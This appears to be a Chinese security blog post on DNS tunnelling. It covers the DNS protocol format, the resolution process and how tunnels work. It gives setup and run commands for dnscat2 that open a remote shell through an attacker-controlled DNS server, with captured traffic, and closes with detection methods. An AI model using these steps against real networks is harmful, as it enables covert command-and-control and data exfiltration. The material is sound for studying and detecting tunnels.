---
layout:     post
title:  DNS tunnel 实践及检测思考
subtitle:   DNS tunnel
date:       2019-05-12
author:     DC
header-img: img/10.jpg
catalog: true
tags:
    - tool
    - DNS tunnel
---



# DNS tunnel 实践及检测思考



### DNS协议

> DNS协议则是用来将域名转换为IP地址（也可以将IP地址转换为相应的域名地址）。
>
> DNS承载于UDP之上，在特殊情况下也可以使用TCP，端口都是53，当报文大小超过512字节时，DNS报文会进行截取，并将DNS首部的TC置位，这个时候客户端将向服务器发起TCP连接来进行DNS查询。

DNS协议报文格式

![dnsprotocolformat.jpg](https://github.com/zhongshendoushuizhao/zhongshendoushuizhao.github.io/blob/master/img/dnsprotocolformat.jpg?raw=true)

**Header：**

1. **会话标识（2字节）：**

   是DNS报文的ID标识，对于请求报文和其对应的应答报文，这个字段是相同的，通过它可以区分DNS应答报文是哪个请求的响应

2. **标志（2字节）：**

   组成字节如下：

   | QR（1bit）     | 查询/响应标志，0为查询，1为响应                              |
   | -------------- | ------------------------------------------------------------ |
   | opcode（4bit） | 0表示标准查询，1表示反向查询，2表示服务器状态请求            |
   | AA（1bit）     | 表示授权回答                                                 |
   | TC（1bit）     | 表示可截断的                                                 |
   | RD（1bit）     | 表示期望递归                                                 |
   | RA（1bit）     | 表示可用递归                                                 |
   | rcode（4bit）  | 表示返回码，0表示没有差错，3表示名字差错，2表示服务器错误（Server Failure） |

3. **数量字段（总共8字节）：**

   Questions、Answer RRs、Authority RRs、Additional RRs 各自表示后面的四个区域的数目。

   Questions表示查询问题区域节的数量，Answers表示回答区域的数量，Authoritative namesversers表示授权区域的数量，Additional recoreds表示附加区域的数量



**数据段**

1. **Queries区域**

   长度不固定，且不使用填充字节，一般该字段表示的就是需要查询的域名（如果是反向查询，则为IP，反向查询即由IP地址反查域名）,有  Name(查询数据) +  type（查询类型） + Class（查询类）

   **name数据流：** 长度 + 字符串 （不包含 点，以点为字符串断点） + 长度 + 字符串 + 0（结尾）

   ​                  5 baidu 3 com

    **type（查询类型）**:

   | 类型 | 助记符 | 说明               |
   | ---- | ------ | ------------------ |
   | 1    | A      | 由域名获得IPv4地址 |
   | 2    | NS     | 查询域名服务器     |
   | 5    | CNAME  | 查询规范名称       |
   | 6    | SOA    | 开始授权           |
   | 11   | WKS    | 熟知服务           |
   | 12   | PTR    | 把IP地址转换成域名 |
   | 13   | HINFO  | 主机信息           |
   | 15   | MX     | 邮件交换           |
   | 28   | AAAA   | 由域名获得IPv6地址 |
   | 252  | AXFR   | 传送整个区的请求   |
   | 255  | ANY    | 对所有记录的请求   |

   **查询类：通常为1，表明是Internet数据**

2. **资源记录(RR)区域（包括回答区域，授权区域和附加区域）**

   >  **域名（2字节或不定长）：**它的格式和Queries区域的查询名字字段是一样的。有一点不同就是，当报文中域名重复出现的时候，该字段使用2个字节的偏移指针来表示。比如，在资源记录中，域名通常是查询问题部分的域名的重复，因此用2字节的指针来表示，具体格式是最前面的两个高位是 11，用于识别指针。其余的14位从DNS报文的开始处计数（从0开始），指出该报文中的相应字节数。一个典型的例子，`C00C`(11**00000000001100，**12正好是头部的长度，其正好指向Queries区域的查询名字字段)。
   >
   > **查询类型：**表明资源纪录的类型，见1.2节的查询类型表格所示 
   >
   > **查询类：**对于Internet信息，总是IN
   >
   > **生存时间（TTL）：**以秒为单位，表示的是资源记录的生命周期，一般用于当地址解析程序取出资源记录后决定保存及使用缓存数据的时间，它同时也可以表明该资源记录的稳定程度，极为稳定的信息会被分配一个很大的值（比如86400，这是一天的秒数）。
   >
   > **资源数据：该字段是一个可变长字段，表示按照查询段的要求返回的相关资源记录的数据。可以是Address（表明查询报文想要的回应是一个IP地址）或者CNAME（表明查询报文想要的回应是一个规范主机名）等。**



### 域名解析过程

> 域名解析总体可分为两大步骤，第一个步骤是本机向本地域名服务器发出一个DNS请求报文，报文里携带需要查询的域名；第二个步骤是本地域名服务器向本机回应一个DNS响应报文，里面包含域名对应的IP地址。
>
> 主机常用递归查询
>
> 域名服务器常用迭代查询

其具体的流程可描述如下：

1. 主机172.16.1.10先向本地域名服务器114.114.114.114进行**递归查询**
2. 本地域名服务器采用**迭代查询**，向一个根域名服务器进行查询
3. 根域名服务器告诉本地域名服务器，下一次应该查询的顶级域名服务器**com**的IP地址
4. 本地域名服务器向顶级域名服务器**com**进行查询
5. 顶级域名服务器**com**告诉本地域名服务器，下一步查询权限服务器**dns.baidu.com** 的IP地址
6. 本地域名服务器向权限服务器**dns.baidu.com**进行查询
7. 权限服务器**dns.baidu.com**告诉本地域名服务器所查询的主机的IP地址
8. 本地域名服务器最后把查询结果告诉 172.16.1.10



通过 dig 命令 来 进行  dns  查询

```shell
root@iZbp184m8xhv5x39jk5rbdZ:~# dig @114.114.114.114 www.baidu.com

; <<>> DiG 9.10.3-P4-Ubuntu <<>> @114.114.114.114 www.baidu.com
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 41561
;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 512
;; QUESTION SECTION:
;www.baidu.com.                 IN      A            #采用的是A记录

;; ANSWER SECTION:
www.baidu.com.          101     IN      CNAME   www.a.shifen.com.    #所查询的服务器
www.a.shifen.com.       198     IN      A       180.97.33.107
www.a.shifen.com.       198     IN      A       180.97.33.108

;; Query time: 12 msec                              #查询服务器
;; SERVER: 114.114.114.114#53(114.114.114.114)
;; WHEN: Fri May 17 19:36:38 CST 2019
;; MSG SIZE  rcvd: 101


```





### DNS  tunnel 说明

> DNS隧道技术是指利用 DNS协议建立隐蔽信道,实现隐蔽数据传输。
>
> 当我们能够控制一台域名服务器(Authorization Server)，在一台内网主机上我们尝试访问一个域名，并且在本地的递归解析器中并没有留下缓存的话，那么其就会向我们之前所说的进行迭代查找。我们控制一个域名服务器的话，那么这个查找最终就会查找到对应的服务器上，控制域名服务器会对我们的请求进行回复，从而构建成一个逻辑上的通路。基于协议进行数据篡改，就可以达到一定数据传输的目的（绕过认证上网，采用这个原理，绕过认证的服务器）
>
> 常见工具：
>
> ```
> 1. iodine: https://github.com/yarrick/iodine
> This is a piece of software that lets you tunnel IPv4 data through a DNS server. This can be usable in different situations where internet access is firewalled, but DNS queries are allowed.
> 
> 2. Dns2tcp: https://www.aldeid.com/wiki/Dns2tcp
> Dns2tcp is a tool for relaying TCP connections over DNS. Among other things, it can be used to bypass captive portals (e.g. hotels, airport, ...) when only port 53/udp is allowed by the firewall.
> 
> 3. tcp-over-dns: http://analogbit.com/software/tcp-over-dns/
> tcp-over-dns contains a special dns server and a special dns client. The client and server work in tandem to provide a TCP (and now UDP too!) tunnel through the standard DNS protocol.
> 
> 4. Heyoka: http://heyoka.sourceforge.net/
> Heyoka is a Proof of Concept of an exfiltration tool which uses spoofed DNS requests to create a bidirectional tunnel. It aims to achieve both performance and stealth
> 
> 5. Dnscat: https://wiki.skullsecurity.org/Dnscat
> dnscat is designed in the spirit of netcat, allowing two hosts over the Internet to talk to each other. The major difference between dnscat and netcat, however, is that dnscat routes all traffic through the local (or a chosen) DNS server
> ```



![dns05.jpg](https://github.com/zhongshendoushuizhao/zhongshendoushuizhao.github.io/blob/master/img/dns05.jpg?raw=true)

### DNS  tunnel 实践

> DNS隧道应用场景较多，渗透测试绕过，木马通信隐藏等
>
> 常见的 DNS 使用方式
>
> **IP直连型 DNS隧道木马**
>
> DNS隧道木马的服务器可以与本地主机通过IP直接通信，传输协议采用 DNS协议，则称为 IP直连型 DNS隧道木马。
>
> 1. 利用53端口进行传输交互数据，而53端口的外联基本上在所有机器上都必须开放，否则则无法使用互联网DNS服务；
> 2. 精心构造传输的载荷内容，使其至少从格式上是符合DNS query包格式，因为如果攻击者构造的UDP载荷内容不符合DNS报文格式，在 wireshark等流量分析工具的流量解析下，很容易出现 DNS报文异常的情况；
>
> **域名型 DNS隧道木马 - DNS迭代查询中继隧道**
>
> 1. 被控端把要传输的内容封装（protocol wrap）在dns query请求包中，发起一次正常的dns解析请求；
> 2. 当被控端向任意一台DNS服务器请求该域名下的子域名时，本地 DNS服务器无论是通过递归查询还是迭代查询，都会向外转发这个DNS请求，最终这个DNS请求都会被送到黑客控制的权威NS服务器中（这意味着黑客必须事先配置好NS以及A记录解析）；
> 3. NS服务器控制端解析请求报文，得到被控端传来的信息，然后将攻击控制命令通过封装在DNS响应报文中；
> 4. 从而实现双方通信，所有的通信都必须由被控端（client端）主动发起，不断回传数据并接受新指令。



使用dnscat2 进行实践测试，其是常见的CS结构

[Dnscat2](https://github.com/iagox86/dnscat2)

> - exe：<https://downloads.skullsecurity.org/dnscat2/dnscat2-v0.07-client-win32.zip>
> - ps：<https://github.com/lukebaggett/dnscat2-powershell>

**安装与测试运行**

服务端：

```
安装
# 如果是上面地址直接下载的，则跳过
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2
cd server
sudo gem install bundler
bundle install

运行

#启动
sudo ruby./dnscat2.rb abc.com --secret=123456   #方式1
sudo ruby./dnscat2.rb --dns server=127.0.0.1,port=533,type=TXT --secret=123456   #方式2
sudo ruby./dnscat2.rb abc.com --secret=123456 --security=open --no-cache   #方式3



```

客户端：

```
安装
# 如果是上面地址直接下载的，则跳过
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/client/
make

运行

dnscat --secret=123456 abc.com    #对应 方式1
dnscat --dns server=<your dnscat2 server ip>,port=553,type=TXT   #对应 方式2，注意使用--dns选项时，port不可省



```



```
获取shell
dnscat2> New session established: 9024
dnscat2> session -i 9024
Welcome to session 9024!
If it's a shell session and you're not seeing output, try typing "pwd" or something!
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
C:\Users\REM\Desktop>


数据包：
172.16.1.2 > 172.16.1.3: 59036 [1au] TXT? 35bc006955018b0021636f6d6d616e642073657373696f6e00.test123.com.
104.131.93.152.53 > 172.16.1.2: 59036*- q: TXT? 35bc006955018b0021636f6d6d616e642073657373696f6e00.test123/0 [1d] TXT "6c29006955d5b70000"


35bc006955018b0021636f6d6d616e642073657373696f6e00.test123.com.

35bc006955018b0021636f6d6d616e642073657373696f6e00 为明显的
加密数据 
数据段过长 采用 TXT 数据格式
```





###  检测方法总结

[DNS Tunnel隧道隐蔽通信实验 && 尝试复现特征向量化思维方式检测](<https://www.cnblogs.com/LittleHann/p/8656621.html#_label3_1_4_0>)

一文中，将特征向量化思维方式的方式进行检测。分为了 

1. 可用于DNS tunnel的检测思路 - 基于UDP DNS会话

2. 可用于DNS tunnel的检测思路 - 基于DNS QUERY维度

在实际操作中

总结来说分为

1. 特征条件检测

2. 统计学类检测的方法



**特征条件检测**

借鉴项目[dns_tunnel_dectect_with_CNN](<https://github.com/BoneLee/dns_tunnel_dectect_with_CNN>)

所采用的的大量同类型流量样本，通过CNN模型来做深度学习生成检测模型，来判断网络上单包数据的准确度

不过依赖于样本量的准确度，但是可实现单包的检测



**统计学类检测的方法**

上述文章中介绍了

1. TXT记录类型发送请求和响应 异常
2. NXDOMAIN 请求异常
3. session会话中的dns type数量异常
4. Zipf定律的分布趋势斜率较低
5. DNS会话时长
6. DNS会话中数据包总数
7. “上行大包”占请求报文总数的比例
8. “下行小包”占响应报总数的比例
9. 有效载荷的上传下载比
10. 有效载荷部分是否加密
11. 域名对应的主机名数量
12. FQDN数异常检测
13. 总的query 报文Payload载荷量

等基于协议特点的统计学检测手段

均形成检测模型 在短时间内通过解析流量的统计学角度进行检测







**相关链接**

<https://www.cnblogs.com/LittleHann/p/8656621.html#_label3_1_4_0>

<https://github.com/iagox86/dnscat2>

<https://www.freebuf.com/articles/network/158163.html>

<https://github.com/BoneLee/dns_tunnel_dectect_with_CNN>

<https://github.com/ArturB/snort3-dns-tunnel/blob/master/ips_dns_tunnel/start.sh>